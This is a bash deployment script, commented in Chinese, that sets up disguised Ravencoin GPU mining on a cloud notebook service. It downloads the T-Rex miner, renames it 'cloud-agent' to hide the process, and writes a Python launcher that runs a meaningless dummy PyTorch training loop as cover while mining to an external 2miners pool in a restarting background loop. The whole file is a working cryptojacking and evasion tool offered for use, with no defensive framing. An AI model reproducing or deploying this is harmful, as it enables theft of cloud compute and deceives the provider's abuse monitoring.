#!/usr/bin/env bash
set -euo pipefail

echo "🚀 一键部署开始：ML伪装 + KawPow 挖矿 (T4 on CloudStudio.net)"

# 1. 安装系统依赖
echo "1/5 安装系统依赖..."
sudo apt update -y
sudo apt install -y wget screen psmisc python3 python3-pip

# 2. 安装 PyTorch（GPU 版）
echo "2/5 安装 PyTorch..."
pip3 install --no-cache-dir torch torchvision

# 3. 下载并伪装 T‑Rex
echo "3/5 下载 T-Rex 并伪装进程名为 cloud-agent..."
TREX_VER="0.26.8"
wget -q https://github.com/trexminer/T-Rex/releases/download/${TREX_VER}/t-rex-${TREX_VER}-linux.tar.gz
tar -xzf t-rex-${TREX_VER}-linux.tar.gz
mv t-rex cloud-agent
chmod +x cloud-agent

# 4. 生成 ML+Miner 并行脚本
echo "4/5 生成 ml_cover_miner.py..."
cat > ml_cover_miner.py << 'EOF'
#!/usr/bin/env python3
import os, time, threading, subprocess
import torch, torch.nn as nn, torch.optim as optim

# 读取环境变量
POOL = os.environ.get("POOL", "stratum+tcp://rvn.2miners.com:6060")
WALLET = os.environ.get("RVN_WALLET")
if not WALLET:
    raise SystemExit("❌ 请先设置环境变量 RVN_WALLET")

# 简单 DummyNet
class DummyNet(nn.Module):
    def __init__(self):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(100, 128), nn.ReLU(),
            nn.Linear(128, 10),
        )
    def forward(self, x):
        return self.net(x)

def ml_task():
    # 限制 PyTorch 占用 50% GPU 内存
    if torch.cuda.is_available():
        torch.cuda.set_per_process_memory_fraction(0.5, device=0)
    device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu")
    model = DummyNet().to(device)
    opt = optim.Adam(model.parameters(), lr=1e-3)
    loss_fn = nn.CrossEntropyLoss()
    data = torch.randn(64, 100, device=device)
    target = torch.randint(0, 10, (64,), device=device)
    print("[ML] Start training dummy model...")
    for epoch in range(1, 101):
        opt.zero_grad()
        out = model(data)
        loss = loss_fn(out, target)
        loss.backward()
        opt.step()
        if epoch % 10 == 0:
            print(f"[ML] Epoch {epoch:03d} Loss {loss.item():.4f}")
        time.sleep(0.5)
    print("[ML] Training done.")

def miner_task():
    worker = f"{os.uname().nodename}-{int(time.time())}"
    cmd = [
        "./cloud-agent", "-a", "kawpow",
        "-o", POOL,
        "-u", f"{WALLET}.{worker}",
        "-p", "x",
        "--pl", "65",
        "-i", "19",
        "--gpu-report-interval", "60"
    ]
    print("[MINER] Launch:", " ".join(cmd))
    while True:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in p.stdout:
            print("[MINER]", line.strip())
        p.wait()
        print("[MINER] Exited", p.returncode, "-> restarting in 30s")
        time.sleep(30)

if __name__ == "__main__":
    if not os.path.isfile("./cloud-agent"):
        raise SystemExit("❌ cloud-agent (t-rex) not found!")
    t1 = threading.Thread(target=ml_task, name="ML", daemon=True)
    t2 = threading.Thread(target=miner_task, name="Miner", daemon=True)
    t1.start()
    time.sleep(5)  # ML先热身
    t2.start()
    t1.join(); t2.join()
EOF
chmod +x ml_cover_miner.py

# 5. 提示并启动
echo "5/5 请按提示输入你的 Ravencoin 钱包地址，用于挖矿："
read -rp "RVN Wallet Address: " RVN_WALLET
export RVN_WALLET

echo "脚本生成完毕，开始后台运行..."
nohup ./ml_cover_miner.py > run.log 2>&1 &

echo "✅ 部署完成！"
echo "查看日志： tail -f run.log"
echo "随时用 'ps aux | grep ml_cover_miner.py' 查看进程状态。"
